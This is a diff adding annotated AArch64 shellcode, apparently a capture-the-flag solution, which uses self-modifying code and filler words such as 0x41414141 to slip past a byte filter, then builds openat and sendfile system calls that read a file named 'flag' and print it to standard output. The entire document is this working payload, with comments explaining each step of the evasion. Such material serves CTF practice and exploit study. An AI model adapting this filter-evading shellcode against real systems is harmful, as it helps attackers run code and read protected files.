@@ -1,0 +1,80 @@
+0:  .inst 0x32207a7d /* orr w29, w11, #0x3fff */
+
+/* prepare */
+4:  adds w11, w26, #2271
+8:  subs w11, w11, #2056 /* w11 = 0b00_0011_0101_11 = 215 */
+c:  adds w11, w11, #2073 /* w11 = 0b10_0011_1100_00 = 2288 */
+10: adds w17, w26, #2460
+14: adds w18, w26, #2508
+
+/* prepare x1 = "flag" */
+18: subs w25, w11, #2131 /* w25 = 0x9d */
+1c: adds w10, w26, #3036 /* w10 = 3036 */
+20: subs w9, w10, #2064 /* w9 = 0x03cc */
+24: strh w9, [x1, x25]
+28: subs w25, w11, #2129 /* w25 = 0x9f */
+2c: subs w9, w18, #2331 /* w9 = 0xb1 */
+30: strb w9, [x1, x25]
+
+/* prepare x0 = -100 */
+34: subs w25, w11, #2128 /* w25 = 0xa0 */
+38: subs w9, w17, #2332 /* w9 = 0x80 */
+3c: strb w9, [x1, x25]
+40: subs w25, w11, #2127 /* w25 = 0xa1 */
+44: subs w9, w10, #2640 /* w9 = 0x018c */
+48: strh w9, [x1, x25]
+4c: subs w25, w11, #2125 /* w25 = 0xa3 */
+50: subs w9, w18, #2267 /* w9 = 0xf1 */
+54: strb w9, [x1, x25]
+
+/* prepare svc #257: store 0x00 to 0xa6 and 0xba */
+58: subs w25, w11, #2122 /* w25 = 0xa6 */
+5c: strb w26, [x1, x25]
+60: subs w25, w18, #2322 /* w25 = 0xba */
+64: strb w26, [x1, x25]
+
+/* prepare svc #257: store 0xd4 to 0xa7 and 0xbb */
+68: subs w9, w17, #2248 /* w9 = 0xd4 */
+6c: subs w25, w11, #2121 /* w25 = 0xa7 */
+70: strb w9, [x1, x25]
+74: subs w25, w18, #2321 /* w25 = 0xbb */
+78: strb w9, [x1, x25]
+
+7c: .inst 0x32203d7d /* orr w29, w11, #0x3fff */
+80: .inst 0x3220307d /* orr w29, w11, #0x3fff */
+84: cbnz w26, 0x40404 /* branch instruction for i-cache flushing */
+
+/* store "\x00" to 0xf7 to end the string "flag" */
+88: subs w25, w18, #2261 /* w25 = 0xf7 */
+8c: strb w26, [x1, x25]
+
+/* openat(-100, data_offset, 0, 0) */
+90: subs w2, w17, #2460 /* w2 = 0x0 */
+94: subs w3, w17, #2460 /* w3 = 0x0 */
+98: subs w8, w18, #2452 /* w8 = 0x38 */
+9c: .inst 0x41414121 /* (b103cc21) adds x1, x1, #0xf3 */ /* x1 = "flag" */
+a0: .inst 0x41414141 /* (f1018c80) subs x0, x4, #0x63 */ /* x0 = -100 */
+a4: .inst 0x41413021 /* svc #257 */
+
+/* sendfile(1, 3, 0, 0xf7) */
+a8: subs w0, w17, #2459 /* w0 = 0x1 */
+ac: subs w1, w17, #2457 /* w1 = 0x3 */
+b0: subs w3, w18, #2261 /* w3 = 0xf7 */
+b4: subs w8, w17, #2389 /* w8 = 0x47 */
+b8: .inst 0x41413021 /* svc #257 */
+
+bc: .inst 0x41414141
+c0: .inst 0x41414141
+c4: .inst 0x41414141
+c8: .inst 0x41414141
+cc: .inst 0x41414141
+d0: .inst 0x41414141
+d4: .inst 0x41414141
+d8: .inst 0x41414141
+dc: .inst 0x41414141
+e0: .inst 0x41414141
+e4: .inst 0x41414141
+e8: .inst 0x41414141
+ec: .inst 0x41414141
+f0: .inst 0x66414141
+f4: .inst 0x4167616c
